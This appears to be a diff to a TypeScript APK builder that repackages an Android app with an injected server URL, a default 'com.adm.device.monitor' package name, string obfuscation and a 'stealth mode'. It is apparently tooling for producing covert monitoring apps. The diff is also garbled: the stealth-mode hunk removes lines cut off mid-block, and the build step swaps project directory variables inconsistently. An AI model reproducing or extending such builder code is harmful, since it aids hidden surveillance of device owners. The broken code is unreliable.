@@ -68,19 +68,19 @@ export interface BuildResult {
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 
-class APKCompiler {
+export class APKCompiler {
   private projectRoot: string;
   private assetsDir: string;
   private buildDir: string;
   private apktoolPath: string;
   private signerPath: string;
 
-  constructor() {
-    this.projectRoot = resolve(join(__dirname, ".."));
+  constructor(projectRoot: string = resolve(join(__dirname, ".."))) {
+    this.projectRoot = projectRoot;
     this.assetsDir = join(this.projectRoot, "server", "assets");
     this.buildDir = join(this.projectRoot, "apk-builds");
     this.apktoolPath = join(this.assetsDir, "apktool.jar");
-    this.signerPath = join(this.assetsDir, "sign.jar");
+    this.signerPath = join(this.assetsDir, "uber-apk-signer.jar");
 
     if (!existsSync(this.buildDir)) {
       mkdirSync(this.buildDir, { recursive: true });
@@ -234,31 +234,56 @@ class APKCompiler {
       logs.push(`[OK] URL inyectada correctamente`);
     }
 
+    // Modificar AndroidManifest.xml (Renombrado manual de paquete y flags de compatibilidad)
+    const manifestPath = join(tempProjectDir, "AndroidManifest.xml");
+    if (existsSync(manifestPath)) {
+      try {
+        let content = readFileSync(manifestPath, "utf8");
+        
+        // Renombrar paquete
+        let safePackageName = config.packageName || "com.adm.device.monitor";
+        if (safePackageName.startsWith("com.system") || safePackageName.startsWith("com.android") || safePackageName.startsWith("com.google")) {
+          safePackageName = "com.adm.device.monitor";
+        }
+        
+        // Reemplazar el atributo package en la etiqueta <manifest>
+        content = content.replace(/package="[a-z0-9_.]+"/, `package="${safePackageName}"`);
+        
+        // Añadir android:extractNativeLibs="true" a la etiqueta <application> (Fix Android 14 installation)
+        if (!content.includes("android:extractNativeLibs")) {
+          content = content.replace("<application", '<application android:extractNativeLibs="true"');
+        }
+
+        writeFileSync(manifestPath, content);
+        logs.push(`[OK] Manifest actualizado con paquete: ${safePackageName}`);
+      } catch (e) {
+        logs.push(`[WARN] Error actualizando manifest: ${e}`);
+      }
+    }
+
     // Modificar apktool.yml para cambiar el nombre del paquete de forma segura (Fix Android 14)
     const apktoolYamlPath = join(tempProjectDir, "apktool.yml");
     if (existsSync(apktoolYamlPath)) {
       try {
         let content = readFileSync(apktoolYamlPath, "utf8");
         
-        // Evitar nombres que empiecen por com.system, com.android, com.google (Bloqueados en Android 14)
         let safePackageName = config.packageName || "com.adm.device.monitor";
         if (safePackageName.startsWith("com.system") || safePackageName.startsWith("com.android") || safePackageName.startsWith("com.google")) {
           safePackageName = "com.adm.device.monitor";
-          logs.push(`[PACKAGE] [FIX] Nombre de paquete restringido detectado. Usando: ${safePackageName}`);
         }
 
         content = content.replace(/renameManifestPackage: null/, `renameManifestPackage: ${safePackageName}`);
         
         // También actualizar versión si se proporciona
         if (config.versionCode) {
-          content = content.replace(/versionCode: '.*?'/, `versionCode: '${config.versionCode}'`);
+          content = content.replace(/versionCode: '.*?'/g, `versionCode: '${config.versionCode}'`);
         }
         if (config.versionName) {
-          content = content.replace(/versionName: '.*?'/, `versionName: '${config.versionName}'`);
+          content = content.replace(/versionName: '.*?'/g, `versionName: '${config.versionName}'`);
         }
 
         writeFileSync(apktoolYamlPath, content);
-        logs.push(`[OK] Paquete configurado como: ${safePackageName}`);
+        logs.push(`[OK] apktool.yml configurado como: ${safePackageName}`);
       } catch (e) {
         logs.push(`[WARN] Error actualizando apktool.yml: ${e}`);
       }
@@ -350,21 +375,10 @@ class APKCompiler {
         await this.obfuscateStrings(projectDir, logs);
       }
 
-      // Stealth mode
+      // Stealth mode (Ya manejado en prepareProject, pero aseguramos si se requiere algo extra)
       if (config.stealthMode) {
-        const stringsPath = join(projectDir, "res", "values", "strings.xml");
-        if (existsSync(stringsPath)) {
-          let content = readFileSync(stringsPath, "utf8");
-          if (!content.includes("stealth_mode_enabled")) {
-            content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
-            writeFileSync(stringsPath, content);
-    const tempProjectDir = join(buildIdDir, "project");
-
-    try {
-      logs.push(`[BUILD] Starting compilation for build ${config.buildId}...`);
-      
-      // 1. Preparar el proyecto (Smali, Manifest, Iconos, etc)
-      await this.prepareProject(config, logs);
+        logs.push(`[STEALTH] Stealth mode enabled`);
+      }
 
       const javaCmd = this.getJavaCommand();
       const unsignedApk = join(buildIdDir, "unsigned.apk");
@@ -372,7 +386,7 @@ class APKCompiler {
       // USAR APKTOOL PARA CONSTRUIR (Asegura alineamiento y empaquetado correcto)
       logs.push(`[BUILD] Recompiling with apktool...`);
       try {
-        const apktoolCmd = `${javaCmd} -jar "${this.apktoolPath}" b "${tempProjectDir}" -o "${unsignedApk}" --use-aapt2`;
+        const apktoolCmd = `${javaCmd} -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}" --use-aapt2`;
         execSync(apktoolCmd, { stdio: "pipe" });
         logs.push(`[OK] APK compiled with apktool`);
       } catch (buildError: any) {
